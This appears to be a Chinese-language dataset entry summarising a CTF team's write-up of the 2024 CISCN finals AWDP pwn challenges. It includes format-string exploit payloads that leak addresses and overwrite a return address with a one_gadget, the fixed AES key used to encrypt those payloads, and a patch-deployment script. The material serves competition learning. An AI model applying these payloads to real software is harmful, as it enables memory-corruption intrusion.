---
title: 第十七届CISCN总决赛-AWDP-PWN部分题解
contest: CISCN总决赛
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [AWDP赛制,format-string,heap-AWDP,AES-ECB加密payload,pwn_fix替换]
attack_chain: AWDP赛制: tar zcvf update.tar.gz update.sh pwn_fix,update.sh中mv pwn_fix /home/ctf/pwn+chmod 777|pwn1: 格式化字符串+AES-ECB加密payload,'%6+6$p'泄stack+libc_base='%6+9$p'-__libc_start_main-243+逐字节fmt写stack_ret=stack-232为libc_base+0xe3b01 one_gadget+8字节rop|pwn2: heap列表[0xA080] shl idx,3; push; mov rdi,[rdx]; call free; pop rdx; mov [rdx],rdi 清理指针
key_payload: mv pwn_fix /home/ctf/pwn + chmod 777|pay = f"%{6+6}$p" → stack|libc_base = int(ru('!'),16) - libc.sym['__libc_start_main'] - 243|stack_ret = stack - 232|ogg = 0xe3b01; rop = p64(libc_base + ogg)|for i in range(len(rop)): pay = f"%{(stack_ret + i) & 0xFFFF}c%{6+0xb}$hn\x00" + sendpay(pay)|AES.new(key=7BF35CD69C475D5E6F1D7A23187BF934, AES.MODE_ECB) encrypt(_pad(pay))
one_liner: 第十七届CISCN总决赛AWDP PWN2题:tar update.tar.gz(update.sh+pwn_fix)替换赛题二进制+chmod+AWDP赛制攻防两用|pwn1格式化字符串+AES-ECB加密payload逐字节%hn写one_gadget(0xe3b01)|pwn2 heap_list[0xA080] shl idx,3+free+pop清指针
lesson: 1) AWDP攻防:tar打包update.sh+修复pwn二进制+chmod 777+远程解压覆盖/启动服务; 2) fmt + AES-ECB加密payload:key固定7BF35CD69C475D5E6F1D7A23187BF934,ECB模式无IV,每条payload需_pad到16倍数; 3) fmt逐字节写:%{(stack_ret+i)&0xFFFF}c%{6+0xb}$hn写addr低2字节 + %19c%{6+0x27}$hn写值; 4) 一次性one_gadget:libc_base+0xe3b01 8字节覆盖返回地址; 5) heap_list漏洞:[idx*8+0xA080]取出指针调free,ret后rdi空+pop清[rdx]=rdi
quality: high
---

## 备注

原文(https://www.ctfiot.com/198770.html)2024年CISCN总决赛AWDP赛制,ChaMd5战队WP。文件含NUL字节需用iconv清洗。

### 题目详情

**AWDP赛制打包**
```sh
#!/bin/sh
mv pwn_fix /home/ctf/pwn
chmod 777 /home/ctf/pwn
```
- 打包:`tar zcvf update.tar.gz update.sh pwn_fix`
- 解压后update.sh自动覆盖/home/ctf/pwn并chmod 777

**pwn1: 格式化字符串+AES-ECB加密**
- key=`7BF35CD69C475D5E6F1D7A23187BF934`(16字节)
- AES-ECB无IV,16字节倍数
- 流程:
  1. `pay = '%{6+6}$p'` 泄stack
  2. `pay = '%{count & 0xFFFF}c%{6+0xb}$hn'` 写stack低2字节
  3. `pay = '%19c%{6+0x27}$hn'` 写值
  4. `pay = '%{6+9}$p'` 泄__libc_start_main+243
  5. libc_base = leak - libc.sym['__libc_start_main'] - 243
  6. ogg=0xe3b01,rop=p64(libc_base+ogg)
  7. for i in range(len(rop)): 逐字节写
  8. `pay = 'A\x00'` 触发

**pwn2: heap列表**
- heap_list[0xA080]数组
- `shl eax, 3` (idx*8) `lea rdx, [0xA080]` `add rdx, rax`
- `push rdx; mov rdi, [rdx]; call _free; pop rdx; mov [rdx], rdi`
- ret后rdi清空

### gdbscript
```
brva 0x15CB
brva 0x00015FF
```

## 评级

- **quality: high** — AWDP赛制完整打包+exp脚本,AES-ECB加密payload逐字节fmt write,one_gadget 0xe3b01全套
- **vuln_type: pwn_unknown** — PWN为主,AWDP赛制攻防
- 实战价值:CISCN AWDP是国家队级别赛制,exp+修复双线操作
